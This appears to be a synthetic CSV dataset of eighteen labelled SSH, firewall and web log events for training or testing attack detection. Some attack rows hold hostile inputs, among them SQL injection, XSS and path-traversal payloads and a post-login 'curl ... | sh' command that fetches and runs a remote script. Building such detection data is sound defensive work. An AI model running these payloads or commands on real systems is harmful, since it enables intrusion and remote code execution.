case_id,binary_label,attack_category,log_source,event_type,protocol,service,http_method,http_status_family,http_user_agent_family,firewall_action,ssh_auth_result,username_type,source_dataset,hour,day_of_week,is_weekend,src_port,dst_port,duration_seconds,total_bytes,bytes_sent,bytes_received,packets,packets_sent,packets_received,status_code,url_length,query_length,url_depth,suspicious_path_tokens,user_agent_length,ssh_failed_logins_10m,ssh_invalid_user,ssh_privileged_username,ssh_success_after_failures,firewall_is_allowed,firewall_is_blocked,denied_admin_port,src_event_count,timestamp,src_ip,dst_ip,username,url_path,user_agent,raw_message
case_01,normal,normal,ssh,ssh_auth,tcp,ssh,unknown,unknown,unknown,unknown,accepted,standard,scenario_mixed_shift,9,6,1,54321,22,0,0,0.0,0.0,0,0.0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,2.0,2026-05-17T09:00:00Z,10.20.1.15,,deploy,,,Accepted publickey for deploy from 10.20.1.15
case_02,normal,normal,firewall,firewall_allow,network,dns,unknown,unknown,unknown,allow,unknown,unknown,scenario_mixed_shift,9,6,1,49152,53,2,2400,1680.0,480.0,16,11.2,4.8,0,0,0,0,0,0,0,0,0,0,1,0,0,4.0,2026-05-17T09:00:00Z,10.20.1.50,,,,,allow DNS request from workstation
case_03,normal,normal,web,web_access,http,web,GET,2xx,browser,unknown,unknown,unknown,scenario_mixed_shift,9,6,1,0,80,0,4812,0.0,4812.0,0,0.0,0.0,200,10,0,0,0,11,0,0,0,0,0,0,0,1.0,2026-05-17T09:01:00Z,10.20.1.34,,,/dashboard,Mozilla/5.0,"GET /dashboard 200 ""Mozilla/5.0"""
case_04,normal,normal,ssh,ssh_auth,tcp,ssh,unknown,unknown,unknown,unknown,failed,standard,scenario_mixed_shift,9,6,1,54321,22,0,0,0.0,0.0,0,0.0,0.0,0,0,0,0,0,0,1,0,0,0,0,0,0,2.0,2026-05-17T09:02:00Z,10.20.1.15,,deploy,,,Single failed password for deploy from 10.20.1.15
case_05,normal,normal,web,web_access,http,web,GET,2xx,curl,unknown,unknown,unknown,scenario_mixed_shift,9,6,1,0,80,0,128,0.0,128.0,0,0.0,0.0,200,7,0,0,0,8,0,0,0,0,0,0,0,1.0,2026-05-17T09:03:00Z,10.20.1.90,,,/health,curl/8.1,"GET /health 200 ""curl/8.1"""
case_06,normal,normal,firewall,firewall_allow,network,https,unknown,unknown,unknown,allow,unknown,unknown,scenario_mixed_shift,9,6,1,49152,443,2,18400,12880.0,3680.0,34,23.799999999999997,10.2,0,0,0,0,0,0,0,0,0,0,1,0,0,5.0,2026-05-17T09:04:00Z,10.20.1.50,,,,,allow HTTPS session from workstation
case_07,attack,ssh_bruteforce,ssh,ssh_auth,tcp,ssh,unknown,unknown,unknown,unknown,failed,privileged,scenario_mixed_shift,9,6,1,54321,22,0,0,0.0,0.0,0,0.0,0.0,0,0,0,0,0,0,42,0,1,0,0,0,0,3.0,2026-05-17T09:05:00Z,198.51.100.44,,root,,,42 failed SSH passwords for root from 198.51.100.44 in 10 minutes
case_08,attack,firewall_block,firewall,firewall_deny,network,ssh,unknown,unknown,unknown,deny,unknown,unknown,scenario_mixed_shift,9,6,1,49152,22,2,420,294.0,84.0,3,2.0999999999999996,0.8999999999999999,0,0,0,0,0,0,0,0,0,0,0,1,1,46.0,2026-05-17T09:05:00Z,198.51.100.44,,,,,deny repeated SSH attempts from 198.51.100.44
case_09,attack,web_sql_injection,web,web_access,http,web,GET,4xx,sqlmap,unknown,unknown,unknown,scenario_mixed_shift,9,6,1,0,80,0,925,0.0,925.0,0,0.0,0.0,403,40,33,0,0,10,0,0,0,0,0,0,0,1.0,2026-05-17T09:06:00Z,203.0.113.25,,,/login?user=admin%27%20OR%20%271%27=%271,sqlmap/1.7,SQL injection probe against /login
case_10,attack,firewall_port_scan,firewall,firewall_drop,network,rdp,unknown,unknown,unknown,drop,unknown,unknown,scenario_mixed_shift,9,6,1,49152,3389,2,260,182.0,52.0,2,1.4,0.6,0,0,0,0,0,0,0,0,0,0,0,1,1,91.0,2026-05-17T09:06:00Z,203.0.113.90,,,,,drop RDP scan from 203.0.113.90
case_11,attack,ssh_invalid_user_scan,ssh,ssh_auth,tcp,ssh,unknown,unknown,unknown,unknown,failed,suspicious,scenario_mixed_shift,9,6,1,54321,22,0,0,0.0,0.0,0,0.0,0.0,0,0,0,0,0,0,18,1,0,0,0,0,0,1.0,2026-05-17T09:07:00Z,203.0.113.88,,guest,,,Invalid user guest from 203.0.113.88 repeated across accounts
case_12,attack,web_xss,web,web_access,http,web,POST,4xx,browser,unknown,unknown,unknown,scenario_mixed_shift,9,6,1,0,80,0,600,0.0,600.0,0,0.0,0.0,400,54,45,0,1,11,0,0,0,0,0,0,0,1.0,2026-05-17T09:08:00Z,203.0.113.26,,,/comment?text=%3Cscript%3Efetch('/token')%3C/script%3E,Mozilla/5.0,XSS payload posted to /comment
case_13,attack,web_path_traversal,web,web_access,http,web,GET,4xx,curl,unknown,unknown,unknown,scenario_mixed_shift,9,6,1,0,80,0,512,0.0,512.0,0,0.0,0.0,403,37,27,0,2,8,0,0,0,0,0,0,0,1.0,2026-05-17T09:09:00Z,203.0.113.27,,,/download?file=../../../../etc/passwd,curl/8.1,Path traversal probe for /etc/passwd
case_14,attack,ssh_suspicious_success,ssh,ssh_auth,tcp,ssh,unknown,unknown,unknown,unknown,accepted,service_or_cloud,scenario_mixed_shift,9,6,1,54321,22,0,0,0.0,0.0,0,0.0,0.0,0,0,0,0,0,0,35,0,0,1,0,0,0,3.0,2026-05-17T09:10:00Z,198.51.100.44,,ubuntu,,,Accepted password for ubuntu after 35 failures from 198.51.100.44
case_15,attack,web_scanner,web,web_access,http,web,GET,4xx,nikto,unknown,unknown,unknown,scenario_mixed_shift,9,6,1,0,80,0,350,0.0,350.0,0,0.0,0.0,404,5,0,0,1,9,0,0,0,0,0,0,0,1.0,2026-05-17T09:11:00Z,203.0.113.28,,,/.env,Nikto/2.5,Scanner requested /.env
case_16,attack,ssh_post_auth_command,ssh,ssh_command,tcp,ssh,unknown,unknown,unknown,unknown,post_auth,service_or_cloud,scenario_mixed_shift,9,6,1,54321,22,0,0,0.0,0.0,0,0.0,0.0,0,0,0,0,0,0,2,0,0,0,0,0,0,3.0,2026-05-17T09:12:00Z,198.51.100.44,,ubuntu,,,Post-auth command: curl -fsSL http://198.51.100.200/a.sh | sh
case_17,attack,firewall_suspicious_outbound,firewall,firewall_allow,network,registered_or_ephemeral,unknown,unknown,unknown,allow,unknown,unknown,scenario_mixed_shift,9,6,1,49152,31337,2,330000,230999.99999999997,66000.0,144,100.8,43.199999999999996,0,0,0,0,0,0,0,0,0,0,1,0,0,28.0,2026-05-17T09:13:00Z,10.20.4.12,,,,,large outbound connection to unusual port 31337
case_18,attack,firewall_block,firewall,firewall_deny,network,smb,unknown,unknown,unknown,deny,unknown,unknown,scenario_mixed_shift,9,6,1,49152,445,2,500,350.0,100.0,4,2.8,1.2,0,0,0,0,0,0,0,0,0,0,0,1,1,39.0,2026-05-17T09:14:00Z,203.0.113.91,,,,,deny SMB attempt from external source
